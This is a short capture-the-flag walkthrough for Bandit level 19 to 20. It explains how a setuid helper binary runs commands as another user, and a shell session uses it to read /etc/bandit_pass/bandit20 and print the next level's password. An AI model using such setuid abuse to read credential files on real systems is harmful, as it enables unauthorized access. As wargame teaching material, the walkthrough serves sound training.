# Bandit Level 19 -> Level 20:

When we run the program `./bandit20-do` we can see that it tells us, that we can run a command as another user. That is because the setuid bit is set, which we can also see by running the `ls -la` command. To confirm this, when we run `./bandit20-do id` we see that the euid (effective user id) is set to bandit20, which means that we can run commands as this user. So we can read the `/etc/bandit_pass/bandit20` file to receive the password.

```sh
bandit19@bandit:~$ ./bandit20-do
Run a command as another user.
  Example: ./bandit20-do id
bandit19@bandit:~$ ls -la bandit20-do
-rwsr-x--- 1 bandit20 bandit19 14876 Apr 23 18:04 bandit20-do
bandit19@bandit:~$ ./bandit20-do id
uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)
bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
VxCazJaVykI6W36BkBU0mJTCM8rR95XT
```
